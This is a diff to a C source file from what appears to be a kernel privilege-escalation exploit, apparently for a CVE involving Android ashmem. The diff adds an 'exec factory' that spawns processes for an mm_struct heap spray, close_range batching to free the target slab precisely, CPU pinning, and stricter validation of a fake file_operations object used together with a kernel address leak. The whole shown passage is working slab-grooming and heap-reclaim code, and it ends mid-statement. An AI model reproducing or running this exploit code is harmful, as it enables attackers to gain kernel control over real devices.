@@ -7,6 +7,7 @@
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
+#include <poll.h>
 #include <sched.h>
 #include <signal.h>
 #include <stdio.h>
@@ -21,6 +22,7 @@
 #include <unistd.h>
 
 #include "90_diagnostic_checkpoint.h"
+#include "00_cpu_discovery.h"
 #include "04_fake_kernel_objects.h"
 #include "05_mm_slab_grooming.h"
 #include "02_slab_cache_probe.h"
@@ -69,6 +71,16 @@ static long groom_env_long_clamped(const char *name, long fallback, long lo,
 #define OSS_RECLAIM_QUIET_SAMPLE_MS 25
 #define OSS_RECLAIM_QUIET_STREAK 3
 #define OSS_RECLAIM_QUIET_MAX_SAMPLES 40
+#define OSS_FACTORY_COMMAND_FD 198
+#define OSS_FACTORY_READY_FD 199
+#define OSS_FACTORY_READY_MAGIC 0x4d4d5244u
+#define OSS_FACTORY_TIMEOUT_MS 10000
+#define OSS_CRITICAL_FD_BASE 8192
+#define OSS_CRITICAL_FD_MAX 96
+
+#ifndef __NR_close_range
+#define __NR_close_range 436
+#endif
 
 struct mm_ctx {
   size_t mm_cnt;
@@ -76,18 +88,48 @@ struct mm_ctx {
   int *memfds;
 };
 
-static int pin_reclaim_to_cpu0(void);
+struct exec_factory_session {
+  int command_pipe[2];
+  int ready_pipe[2];
+  pid_t worker;
+  uint64_t started_ms;
+  struct sigaction old_sigpipe;
+  int sigpipe_guarded;
+};
 
-static pid_t clone_child(void) {
+static int g_groom_cpu;
+
+static int pin_cpu(int cpu);
+static int pin_groom_cpu(void);
+
+static void log_child_start_failure(const char *step, int error,
+                                    int requested_cpu) {
+  cpu_set_t allowed;
+  CPU_ZERO(&allowed);
+  int affinity_ok = sched_getaffinity(0, sizeof(allowed), &allowed) == 0;
+  fprintf(stderr,
+          "[groom-child] start failed step=%s pid=%d ppid=%d cpu=%d "
+          "errno=%d affinity_cpu=%d affinity_ok=%d affinity_allowed=%d\n",
+          step, getpid(), getppid(), sched_getcpu(), error, requested_cpu,
+          affinity_ok,
+          affinity_ok && CPU_ISSET(requested_cpu, &allowed));
+}
+
+static pid_t clone_child(int cpu) {
   pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
   if (child == 0) {
-    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
+      log_child_start_failure("pdeathsig", errno, cpu);
+      _exit(100);
+    }
     if (getppid() == 1) {
-      _exit(0);
+      log_child_start_failure("orphaned", 0, cpu);
+      _exit(101);
     }
 
-    if (pin_reclaim_to_cpu0() != 0) {
-      _exit(1);
+    if (pin_cpu(cpu) != 0) {
+      log_child_start_failure("affinity", errno, cpu);
+      _exit(102);
     }
     for (;;) {
       pause();
@@ -102,9 +144,17 @@ static struct kernelsnitch_shared_state *g_ks_verify;
 static pid_t clone_leak_child(void) {
   pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
   if (child == 0) {
-    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
+      log_child_start_failure("leak-pdeathsig", errno, g_groom_cpu);
+      _exit(110);
+    }
     if (getppid() == 1) {
-      _exit(1);
+      log_child_start_failure("leak-orphaned", 0, g_groom_cpu);
+      _exit(111);
+    }
+    if (pin_groom_cpu() != 0) {
+      log_child_start_failure("leak-affinity", errno, g_groom_cpu);
+      _exit(112);
     }
     /* One pile + one scan feeds both oracles with disjoint collision subsets,
      * replacing two serial pile/scan passes. Both still bruteforce
@@ -119,6 +169,73 @@ static int open_memfd(pid_t child) {
   char path[64];
   snprintf(path, sizeof(path), "/proc/%d/mem", child);
   return open(path, O_RDONLY);
+}
+
+static int diagnostic_status_line(const char *line) {
+  static const char *const fields[] = {
+      "Name:",       "State:",      "Tgid:",       "Pid:",
+      "PPid:",       "TracerPid:",  "Uid:",        "Gid:",
+      "Threads:",    "CoreDumping:", "NoNewPrivs:", "Seccomp:",
+      "Cpus_allowed:", "Cpus_allowed_list:",
+  };
+  for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
+    if (strncmp(line, fields[i], strlen(fields[i])) == 0) return 1;
+  }
+  return 0;
+}
+
+static void diagnose_proc_file(pid_t child, const char *name) {
+  char path[80];
+  snprintf(path, sizeof(path), "/proc/%d/%s", child, name);
+  FILE *file = fopen(path, "re");
+  if (!file) {
+    fprintf(stderr,
+            "[groom] memfd diag file=%s pid=%d open_errno=%d\n", name,
+            child, errno);
+    return;
+  }
+  char line[256];
+  while (fgets(line, sizeof(line), file)) {
+    size_t length = strlen(line);
+    while (length > 0 && (line[length - 1] == '\n' ||
+                          line[length - 1] == '\r')) {
+      line[--length] = '\0';
+    }
+    if (strcmp(name, "status") != 0 || diagnostic_status_line(line)) {
+      fprintf(stderr, "[groom] memfd diag file=%s pid=%d value=%s\n", name,
+              child, line);
+    }
+  }
+  fclose(file);
+}
+
+static void diagnose_memfd_failure(const char *phase, size_t index,
+                                   pid_t child, int open_error) {
+  int alive = kill(child, 0);
+  int alive_error = alive == 0 ? 0 : errno;
+  siginfo_t info;
+  memset(&info, 0, sizeof(info));
+  int wait_result = waitid(P_PID, (id_t)child, &info,
+                           WEXITED | WNOHANG | WNOWAIT);
+  int wait_error = wait_result == 0 ? 0 : errno;
+  cpu_set_t affinity;
+  CPU_ZERO(&affinity);
+  int affinity_result = sched_getaffinity(child, sizeof(affinity), &affinity);
+  int affinity_error = affinity_result == 0 ? 0 : errno;
+  fprintf(stderr,
+          "[groom] memfd diag phase=%s index=%zu pid=%d open_errno=%d "
+          "alive=%d alive_errno=%d wait=%d wait_errno=%d wait_pid=%d "
+          "wait_code=%d wait_status=%d affinity=%d affinity_errno=%d "
+          "parent_pid=%d parent_cpu=%d parent_dumpable=%d groom_cpu=%d\n",
+          phase, index, child, open_error, alive == 0, alive_error,
+          wait_result, wait_error, info.si_pid, info.si_code, info.si_status,
+          affinity_result, affinity_error, getpid(), sched_getcpu(),
+          prctl(PR_GET_DUMPABLE), g_groom_cpu);
+  diagnose_proc_file(child, "status");
+  diagnose_proc_file(child, "stat");
+  diagnose_proc_file(child, "attr/current");
+  diagnose_proc_file(child, "cgroup");
+  errno = open_error;
 }
 
 static void kill_child(pid_t child) {
@@ -183,11 +300,328 @@ static void raise_rlimit_to_max_best_effort(int resource) {
   }
 }
 
-static int pin_reclaim_to_cpu0(void) {
+void groom_set_cpu(int cpu) {
+  g_groom_cpu = cpu;
+}
+
+static int pin_cpu(int cpu) {
   cpu_set_t set;
   CPU_ZERO(&set);
-  CPU_SET(0, &set);
+  CPU_SET(cpu, &set);
   return sched_setaffinity(0, sizeof(set), &set);
+}
+
+static int pin_groom_cpu(void) {
+  return pin_cpu(g_groom_cpu);
+}
+
+static int pin_and_validate_groom_cpu(void) {
+  return cpu_discovery_pin_and_validate(g_groom_cpu, NULL) ? 0 : -1;
+}
+
+static int prepare_close_range_batch(int **sources, size_t count,
+                                     int *first_fd, int *last_fd) {
+  if (!sources || count == 0 || count > OSS_CRITICAL_FD_MAX) return 0;
+  struct rlimit limit;
+  if (getrlimit(RLIMIT_NOFILE, &limit) != 0 ||
+      limit.rlim_cur <= (rlim_t)(OSS_CRITICAL_FD_BASE + count)) {
+    return 0;
+  }
+  for (size_t i = 0; i < count; i++) {
+    int target = OSS_CRITICAL_FD_BASE + (int)i;
+    errno = 0;
+    if (!sources[i] || *sources[i] < 0 ||
+        fcntl(target, F_GETFD) != -1 || errno != EBADF) {
+      return 0;
+    }
+  }
+  size_t duplicated = 0;
+  for (; duplicated < count; duplicated++) {
+    int target = OSS_CRITICAL_FD_BASE + (int)duplicated;
+    if (dup3(*sources[duplicated], target, O_CLOEXEC) != target) break;
+  }
+  if (duplicated != count) {
+    for (size_t i = 0; i < duplicated; i++) {
+      close(OSS_CRITICAL_FD_BASE + (int)i);
+    }
+    return 0;
+  }
+  for (size_t i = 0; i < count; i++) {
+    close(*sources[i]);
+    *sources[i] = -1;
+  }
+  *first_fd = OSS_CRITICAL_FD_BASE;
+  *last_fd = OSS_CRITICAL_FD_BASE + (int)count - 1;
+  return 1;
+}
+
+static int close_range_batch(int first_fd, int last_fd) {
+  if (first_fd < 0 || last_fd < first_fd) return 0;
+  return syscall(__NR_close_range, (unsigned int)first_fd,
+                 (unsigned int)last_fd, 0) == 0;
+}
+
+static int read_exact(int fd, void *buffer, size_t length) {
+  unsigned char *cursor = buffer;
+  while (length > 0) {
+    ssize_t count = read(fd, cursor, length);
+    if (count < 0 && errno == EINTR) continue;
+    if (count <= 0) return 0;
+    cursor += count;
+    length -= (size_t)count;
+  }
+  return 1;
+}
+
+static int write_exact(int fd, const void *buffer, size_t length) {
+  const unsigned char *cursor = buffer;
+  while (length > 0) {
+    ssize_t count = write(fd, cursor, length);
+    if (count < 0 && errno == EINTR) continue;
+    if (count <= 0) return 0;
+    cursor += count;
+    length -= (size_t)count;
+  }
+  return 1;
+}
+
+static int install_factory_fd(int source, int target) {
+  if (source == target) return fcntl(source, F_SETFD, 0) == 0;
+  return dup3(source, target, 0) == target;
+}
+
+static int factory_session_start(struct exec_factory_session *session,
+                                 const char *factory_path) {
+  memset(session, 0, sizeof(*session));
+  session->command_pipe[0] = -1;
+  session->command_pipe[1] = -1;
+  session->ready_pipe[0] = -1;
+  session->ready_pipe[1] = -1;
+  session->worker = -1;
+  session->started_ms = groom_now_ms();
+  struct sigaction ignore_sigpipe;
+  memset(&ignore_sigpipe, 0, sizeof(ignore_sigpipe));
+  ignore_sigpipe.sa_handler = SIG_IGN;
+  sigemptyset(&ignore_sigpipe.sa_mask);
+  if (sigaction(SIGPIPE, &ignore_sigpipe, &session->old_sigpipe) != 0) {
+    fprintf(stderr, "[groom] exec factory SIGPIPE guard failed errno=%d\n",
+            errno);
+    return 0;
+  }
+  session->sigpipe_guarded = 1;
+
+  if (pipe2(session->command_pipe, O_CLOEXEC) != 0 ||
+      pipe2(session->ready_pipe, O_CLOEXEC) != 0) {
+    fprintf(stderr, "[groom] exec factory pipe failed errno=%d\n", errno);
+    return 0;
+  }
+
+  session->worker = fork();
+  if (session->worker < 0) {
+    fprintf(stderr, "[groom] exec factory fork failed errno=%d\n", errno);
+    return 0;
+  }
+  if (session->worker == 0) {
+    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0) {
+      log_child_start_failure("factory-pdeathsig", errno, g_groom_cpu);
+      _exit(120);
+    }
+    if (getppid() == 1) {
+      log_child_start_failure("factory-orphaned", 0, g_groom_cpu);
+      _exit(121);
+    }
+    if (pin_groom_cpu() != 0) {
+      log_child_start_failure("factory-affinity", errno, g_groom_cpu);
+      _exit(122);
+    }
+    if (!install_factory_fd(session->command_pipe[0], OSS_FACTORY_COMMAND_FD) ||
+        !install_factory_fd(session->ready_pipe[1], OSS_FACTORY_READY_FD)) {
+      log_child_start_failure("factory-fds", errno, g_groom_cpu);
+      _exit(123);
+    }
+    for (size_t i = 0; i < 2; i++) {
+      if (session->command_pipe[i] != OSS_FACTORY_COMMAND_FD &&
+          session->command_pipe[i] != OSS_FACTORY_READY_FD) {
+        close(session->command_pipe[i]);
+      }
+      if (session->ready_pipe[i] != OSS_FACTORY_COMMAND_FD &&
+          session->ready_pipe[i] != OSS_FACTORY_READY_FD) {
+        close(session->ready_pipe[i]);
+      }
+    }
+    char *const argv[] = {(char *)factory_path, NULL};
+    char *const envp[] = {NULL};
+    execve(factory_path, argv, envp);
+    log_child_start_failure("factory-execve", errno, g_groom_cpu);
+    _exit(124);
+  }
+
+  close(session->command_pipe[0]);
+  session->command_pipe[0] = -1;
+  close(session->ready_pipe[1]);
+  session->ready_pipe[1] = -1;
+  return 1;
+}
+
+static int factory_session_affinity_ok(
+    const struct exec_factory_session *session) {
+  cpu_set_t allowed;
+  CPU_ZERO(&allowed);
+  return session->worker > 0 &&
+         sched_getaffinity(session->worker, sizeof(allowed), &allowed) == 0 &&
+         CPU_COUNT(&allowed) == 1 && CPU_ISSET(g_groom_cpu, &allowed);
+}
+
+static int factory_session_next(struct exec_factory_session *session,
+                                const char *phase, size_t index,
+                                int *memfd_out) {
+  uint32_t magic = 0;
+  uint64_t elapsed = groom_now_ms() - session->started_ms;
+  int remaining = elapsed < OSS_FACTORY_TIMEOUT_MS
+                      ? OSS_FACTORY_TIMEOUT_MS - (int)elapsed
+                      : 0;
+  struct pollfd ready = {.fd = session->ready_pipe[0], .events = POLLIN};
+  int polled;
+  do {
+    polled = poll(&ready, 1, remaining);
+  } while (polled < 0 && errno == EINTR);
+  if (polled != 1 || !(ready.revents & POLLIN) ||
+      !read_exact(session->ready_pipe[0], &magic, sizeof(magic)) ||
+      magic != OSS_FACTORY_READY_MAGIC || !factory_session_affinity_ok(session)) {
+    fprintf(stderr,
+            "[groom] exec factory handshake failed phase=%s index=%zu "
+            "magic=%08x poll=%d revents=%x affinity=%d errno=%d\n",
+            phase, index, magic, polled, ready.revents,
+            factory_session_affinity_ok(session), errno);
+    return 0;
+  }
+  *memfd_out = open_memfd(session->worker);
+  if (*memfd_out < 0) {
+    int open_error = errno;
+    fprintf(stderr,
+            "[groom] exec factory memfd failed phase=%s index=%zu errno=%d\n",
+            phase, index, open_error);
+    diagnose_memfd_failure(phase, index, session->worker, open_error);
+    return 0;
+  }
+  return 1;
+}
+
+static int factory_session_advance(struct exec_factory_session *session,
+                                   const char *phase, size_t index) {
+  const unsigned char command = 1;
+  if (write_exact(session->command_pipe[1], &command, sizeof(command))) {
+    return 1;
+  }
+  fprintf(stderr,
+          "[groom] exec factory command failed phase=%s index=%zu errno=%d\n",
+          phase, index, errno);
+  return 0;
+}
+
+static int factory_session_stop(struct exec_factory_session *session) {
+  int ok = 1;
+  if (session->worker > 0) kill_child(session->worker);
+  session->worker = -1;
+  for (size_t i = 0; i < 2; i++) {
+    if (session->command_pipe[i] >= 0) close(session->command_pipe[i]);
+    if (session->ready_pipe[i] >= 0) close(session->ready_pipe[i]);
+    session->command_pipe[i] = -1;
+    session->ready_pipe[i] = -1;
+  }
+  if (session->sigpipe_guarded &&
+      sigaction(SIGPIPE, &session->old_sigpipe, NULL) != 0) {
+    fprintf(stderr, "[groom] exec factory SIGPIPE restore failed errno=%d\n",
+            errno);
+    ok = 0;
+  }
+  session->sigpipe_guarded = 0;
+  return ok;
+}
+
+static int fill_prepare_with_exec_factory(struct mm_ctx *ctx,
+                                          const char *factory_path) {
+  struct exec_factory_session session;
+  if (!factory_session_start(&session, factory_path)) {
+    factory_session_stop(&session);
+    return 0;
+  }
+  int ok = 1;
+
+  for (size_t i = 0; i < ctx->mm_cnt; i++) {
+    if (!factory_session_next(&session, "prepare", i, &ctx->memfds[i]) ||
+        (i + 1 < ctx->mm_cnt &&
+         !factory_session_advance(&session, "prepare", i))) {
+      ok = 0;
+      break;
+    }
+  }
+  uint64_t elapsed = groom_now_ms() - session.started_ms;
+  if (!factory_session_stop(&session)) ok = 0;
+  if (ok) {
+    fprintf(stderr,
+            "[groom] exec factory ready objects=%zu cpu=%d elapsed=%llums\n",
+            ctx->mm_cnt, g_groom_cpu, (unsigned long long)elapsed);
+  }
+  return ok;
+}
+
+static int fill_critical_with_exec_factory(
+    struct mm_ctx *pre_ctx, struct mm_ctx *post_ctx, const char *factory_path,
+    pid_t *leak_child_out, int *leak_memfd_out) {
+  struct exec_factory_session session;
+  if (!factory_session_start(&session, factory_path)) {
+    factory_session_stop(&session);
+    return 0;
+  }
+  int ok = 1;
+  for (size_t i = 0; i < pre_ctx->mm_cnt; i++) {
+    if (!factory_session_next(&session, "critical-pre", i,
+                              &pre_ctx->memfds[i]) ||
+        (i + 1 < pre_ctx->mm_cnt &&
+         !factory_session_advance(&session, "critical-pre", i))) {
+      ok = 0;
+      break;
+    }
+  }
+  if (ok) {
+    *leak_child_out = clone_leak_child();
+    if (*leak_child_out < 0) {
+      fprintf(stderr, "[groom] leak clone failed errno=%d\n", errno);
+      ok = 0;
+    }
+  }
+  if (ok) {
+    *leak_memfd_out = open_memfd(*leak_child_out);
+    if (*leak_memfd_out < 0) {
+      int open_error = errno;
+      fprintf(stderr, "[groom] leak memfd failed errno=%d\n", open_error);
+      diagnose_memfd_failure("leak", 0, *leak_child_out, open_error);
+      ok = 0;
+    }
+  }
+  if (ok &&
+      !factory_session_advance(&session, "critical-target", pre_ctx->mm_cnt)) {
+    ok = 0;
+  }
+  for (size_t i = 0; ok && i < post_ctx->mm_cnt; i++) {
+    if (!factory_session_next(&session, "critical-post", i,
+                              &post_ctx->memfds[i]) ||
+        (i + 1 < post_ctx->mm_cnt &&
+         !factory_session_advance(&session, "critical-post", i))) {
+      ok = 0;
+    }
+  }
+  uint64_t elapsed = groom_now_ms() - session.started_ms;
+  if (!factory_session_stop(&session)) ok = 0;
+  if (ok) {
+    fprintf(stderr,
+            "[groom] critical exec factory pre=%zu target=1 post=%zu cpu=%d "
+            "elapsed=%llums\n",
+            pre_ctx->mm_cnt, post_ctx->mm_cnt, g_groom_cpu,
+            (unsigned long long)elapsed);
+  }
+  return ok;
 }
 
 static uint64_t load_u64(const unsigned char *buf, size_t off) {
@@ -207,8 +641,20 @@ static uint64_t fops_object_fingerprint(const unsigned char *buf) {
 
 static int validate_fops_object(const unsigned char *buf,
                                 uint64_t aligned_base) {
-  return load_u64(buf, 0x2000) == 0 &&
-         load_u64(buf, 0x2008) == (aligned_base | 0x14e8ULL) &&
+  return load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET) == 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 8) ==
+             (aligned_base | 0x14e8ULL) &&
+         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET) == 0 &&
+         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET + 8) ==
+             (aligned_base | 0x14e8ULL) &&
+         memcmp(buf + OSS_PRIMARY_FOPS_BUFFER_OFFSET,
+                buf + OSS_RECOVERY_FOPS_BUFFER_OFFSET,
+                OSS_FAKE_FOPS_POPULATED_SIZE) == 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x20) != 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x28) != 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x50) != 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x70) != 0 &&
+         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x80) != 0 &&
          load_u64(buf, 0x2218) == (aligned_base | 0x14d0ULL) &&
          load_u64(buf, 0x2220) == (aligned_base | 0x14d0ULL) &&
          load_u64(buf, 0x2228) == 1;
@@ -257,7 +703,8 @@ static int reclaim_slabs_equal(const struct reclaim_slab_snapshot *a,
          slab_activity_equal(&a->kmalloc4k, &b->kmalloc4k);
 }
 
-static int wait_for_reclaim_quiet_window(int *samples_out) {
+static int wait_for_reclaim_quiet_window(
+    int *samples_out, struct reclaim_slab_snapshot *stable_out) {
   struct reclaim_slab_snapshot previous;
   if (!read_reclaim_slabs(&previous)) {
     return 0;
@@ -278,6 +725,7 @@ static int wait_for_reclaim_quiet_window(int *samples_out) {
     previous = current;
     if (streak >= OSS_RECLAIM_QUIET_STREAK) {
       *samples_out = sample;
+      if (stable_out) *stable_out = current;
       fprintf(stderr,
               "[groom] reclaim quiet pass samples=%d streak=%d "
               "mm=%lu/%lu skb=%lu/%lu kmalloc4k=%lu/%lu\n",
@@ -291,11 +739,38 @@ static int wait_for_reclaim_quiet_window(int *samples_out) {
   return 0;
 }
 
+static int exact_mm_reclaim(const struct mm_slabinfo *before,
+                            const struct mm_slabinfo *after,
+                            unsigned long released_refs) {
+  long long active_drop = (long long)before->active_objs -
+                          (long long)after->active_objs;
+  long long object_drop =
+      (long long)before->num_objs - (long long)after->num_objs;
+  long long active_slab_drop = (long long)before->active_slabs -
+                               (long long)after->active_slabs;
+  long long slab_drop =
+      (long long)before->num_slabs - (long long)after->num_slabs;
+  int pass = object_drop == OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ &&
+             active_slab_drop == 1 && slab_drop == 1;
+  fprintf(stderr,
+          "[groom] exact reclaim active_drop=%lld/%lu object_drop=%lld/32 "
+          "active_slab_drop=%lld/1 slab_drop=%lld/1 pass=%d\n",
+          active_drop, released_refs, object_drop, active_slab_drop,
+          slab_drop, pass);
+  return pass;
+}
+
 static uint64_t groom_and_install_fops_object_impl(
     uint64_t kernel_base, uint64_t ashmem_misc_fops_addr,
     uint64_t init_task_addr) {
   raise_rlimit_to_max_best_effort(RLIMIT_NOFILE);
   raise_rlimit_to_max_best_effort(RLIMIT_NPROC);
+
+  const char *factory_path = getenv("CVE43499_MM_FACTORY");
+  if (!factory_path || factory_path[0] != '/') {
+    fprintf(stderr, "[groom] exec factory path missing\n");
+    return 0;
+  }
 
   uint64_t dbg_t0 = groom_now_ms();
   uint64_t dbg_last = dbg_t0;
@@ -327,29 +802,11 @@ static uint64_t groom_and_install_fops_object_impl(
   }
   memset(skb_buf, 0x41, OSS_SKB_SEND_SIZE);
 
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    prepare_ctx.childs[i] = clone_child();
-    if (prepare_ctx.childs[i] < 0) {
-      fprintf(stderr, "[groom] prepare clone failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
-    if (prepare_ctx.memfds[i] < 0) {
-      fprintf(stderr, "[groom] prepare memfd failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    kill_child(prepare_ctx.childs[i]);
-    prepare_ctx.childs[i] = -1;
+  if (!fill_prepare_with_exec_factory(&prepare_ctx, factory_path)) {
+    goto cleanup;
   }
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
-    spray_ctx.childs[i] = clone_child();
+    spray_ctx.childs[i] = clone_child(g_groom_cpu);
     if (spray_ctx.childs[i] < 0) {
       fprintf(stderr, "[groom] spray clone failed index=%zu errno=%d\n", i,
               errno);
@@ -357,8 +814,10 @@ static uint64_t groom_and_install_fops_object_impl(
     }
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
     if (spray_ctx.memfds[i] < 0) {
+      int open_error = errno;
       fprintf(stderr, "[groom] spray memfd failed index=%zu errno=%d\n", i,
-              errno);
+              open_error);
+      diagnose_memfd_failure("spray", i, spray_ctx.childs[i], open_error);
       goto cleanup;
     }
   }
@@ -378,6 +837,14 @@ static uint64_t groom_and_install_fops_object_impl(
     fprintf(stderr, "[groom] kernelsnitch dual setup failed\n");
     goto cleanup;
   }
+  if (pin_and_validate_groom_cpu() != 0) {
+    fprintf(stderr, "[groom] CPU-%d critical pin failed errno=%d\n",
+            g_groom_cpu, errno);
+    goto cleanup;
+  }
+  fprintf(stderr,
+          "[groom] bulk cpu=%d; critical create/free/reclaim cpu=%d\n",
+          g_groom_cpu, sched_getcpu());
   {
     /* Keep the established repeat count. The smaller waiter pile was
      * measured in the isolated AFZH3 collision benchmark. */
@@ -399,57 +866,9 @@ static uint64_t groom_and_install_fops_object_impl(
   }
   groom_dbg("ksnitch-setup", dbg_t0, &dbg_last);
 
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.childs[i] = clone_child();
-    if (pre_ctx.childs[i] < 0) {
-      fprintf(stderr, "[groom] pre clone failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-  child_leak = clone_leak_child();
-  if (child_leak < 0) {
-    fprintf(stderr, "[groom] leak clone failed errno=%d\n", errno);
+  if (!fill_critical_with_exec_factory(&pre_ctx, &post_ctx, factory_path,
+                                       &child_leak, &memfd_leak)) {
     goto cleanup;
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.childs[i] = clone_child();
-    if (post_ctx.childs[i] < 0) {
-      fprintf(stderr, "[groom] post clone failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
-    if (pre_ctx.memfds[i] < 0) {
-      fprintf(stderr, "[groom] pre memfd failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-  memfd_leak = open_memfd(child_leak);
-  if (memfd_leak < 0) {
-    fprintf(stderr, "[groom] leak memfd failed errno=%d\n", errno);
-    goto cleanup;
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
-    if (post_ctx.memfds[i] < 0) {
-      fprintf(stderr, "[groom] post memfd failed index=%zu errno=%d\n", i,
-              errno);
-      goto cleanup;
-    }
-  }
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    kill_child(pre_ctx.childs[i]);
-    pre_ctx.childs[i] = -1;
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    kill_child(post_ctx.childs[i]);
-    post_ctx.childs[i] = -1;
   }
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     kill_child(spray_ctx.childs[i]);
@@ -574,76 +993,155 @@ static uint64_t groom_and_install_fops_object_impl(
     goto cleanup;
   }
 
-  if (pin_reclaim_to_cpu0() != 0) {
-    fprintf(stderr, "[groom] CPU-0 reclaim pin failed errno=%d\n", errno);
+  if (pin_and_validate_groom_cpu() != 0) {
+    fprintf(stderr, "[groom] CPU-%d reclaim pin failed errno=%d\n",
+            g_groom_cpu, errno);
     goto cleanup;
   }
 
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-
   size_t prepare_slab_count = prepare_ctx.mm_cnt / mm_objs_per_slab;
-  size_t prepare_early_drains = prepare_slab_count;
-  if (prepare_early_drains > 16) {
-    prepare_early_drains = 16;
-  }
-  for (size_t i = 0; i < prepare_early_drains; i++) {
-    size_t index = i * mm_objs_per_slab;
-    close(prepare_ctx.memfds[index]);
-    prepare_ctx.memfds[index] = -1;
-    kill_child(prepare_ctx.childs[index]);
-    prepare_ctx.childs[index] = -1;
-  }
-
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
-    close(spray_ctx.memfds[i]);
-    spray_ctx.memfds[i] = -1;
-  }
-  size_t target_pre = pre_ctx.mm_cnt - 1;
-  close(pre_ctx.memfds[target_pre]);
-  pre_ctx.memfds[target_pre] = -1;
-  close(post_ctx.memfds[0]);
-  post_ctx.memfds[0] = -1;
-  for (size_t i = 0; i < target_pre; i++) {
-    close(pre_ctx.memfds[i]);
-    pre_ctx.memfds[i] = -1;
-  }
-  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
-    close(post_ctx.memfds[i]);
-    post_ctx.memfds[i] = -1;
-  }
-
   close(pcp_sv[0]);
   close(pcp_sv[1]);
   pcp_sv[0] = -1;
   pcp_sv[1] = -1;
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  close(memfd_leak);
-  memfd_leak = -1;
-  size_t prepare_late_drains = prepare_slab_count - prepare_early_drains;
-  if (prepare_late_drains > 16) {
-    prepare_late_drains = 16;
-  }
-  for (size_t i = 0; i < prepare_late_drains; i++) {
-    size_t index = (prepare_early_drains + i) * mm_objs_per_slab;
-    close(prepare_ctx.memfds[index]);
-    prepare_ctx.memfds[index] = -1;
-    kill_child(prepare_ctx.childs[index]);
-    prepare_ctx.childs[index] = -1;
-  }
-  size_t drain_triggers = prepare_early_drains + prepare_late_drains;
 
+  size_t spray_seed_drains = spray_ctx.mm_cnt / mm_objs_per_slab;
+
+  int *cage_sources[OSS_CRITICAL_FD_MAX];
+  size_t cage_count = 0;
+  size_t target_pre = pre_ctx.mm_cnt - 1;
+  cage_sources[cage_count++] = &pre_ctx.memfds[target_pre];
+  cage_sources[cage_count++] = &post_ctx.memfds[0];
+  for (size_t i = 0; i < target_pre; i++) {
+    cage_sources[cage_count++] = &pre_ctx.memfds[i];
+  }
+  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
+    cage_sources[cage_count++] = &post_ctx.memfds[i];
+  }
+  if (cage_count > OSS_CRITICAL_FD_MAX) {
+    fprintf(stderr, "[groom] target cage overflow count=%zu\n", cage_count);
+    goto cleanup;
+  }
+
+  int cage_first_fd = -1, cage_last_fd = -1;
+  if (!prepare_close_range_batch(cage_sources, cage_count, &cage_first_fd,
+                                 &cage_last_fd)) {
+    fprintf(stderr,
+            "[groom] target cage close_range preparation failed count=%zu "
+            "errno=%d\n",
+            cage_count, errno);
+    goto cleanup;
+  }
+  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
+    fprintf(stderr,
+            "[groom] target cage CPU drift expected=%d actual=%d errno=%d\n",
+            g_groom_cpu, sched_getcpu(), errno);
+    for (int close_fd = cage_first_fd; close_fd <= cage_last_fd; close_fd++) {
+      close(close_fd);
+    }
+    goto cleanup;
+  }
+  if (!close_range_batch(cage_first_fd, cage_last_fd)) {
+    int close_error = errno;
+    for (int close_fd = cage_first_fd; close_fd <= cage_last_fd; close_fd++) {
+      close(close_fd);
+    }
+    fprintf(stderr,
+            "[groom] target cage close_range failed first=%d last=%d errno=%d\n",
+            cage_first_fd, cage_last_fd, close_error);
+    goto cleanup;
+  }
+
+  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
+    fprintf(stderr,
